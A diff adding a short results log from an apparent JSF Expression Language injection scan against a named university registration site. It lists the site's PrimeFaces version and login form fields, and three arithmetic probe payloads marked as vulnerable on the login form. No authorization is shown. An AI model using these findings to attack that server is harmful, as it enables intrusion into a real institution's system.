@@ -1,0 +1,13 @@
+JSF ViewState + EL Injection Results
+Target: https://registro.uns.edu.pe:80
+Date: 2026-10-25 15:27:13
+
+ViewState vulnerable: False
+PrimeFaces version: 13.0.1
+ViewState value: None
+
+Form fields: ['frmLogueo', 'frmLogueo:itUsuario', 'frmLogueo:itSeguridad', 'frmLogueo:kbClave', 'frmLogueo:itClave', 'jakarta.faces.ViewState']
+
+[VULN] frmLogueo: #{1+1} -> 2
+[VULN] frmLogueo: ${1+1} -> 2
+[VULN] frmLogueo: #{2*3} -> 6
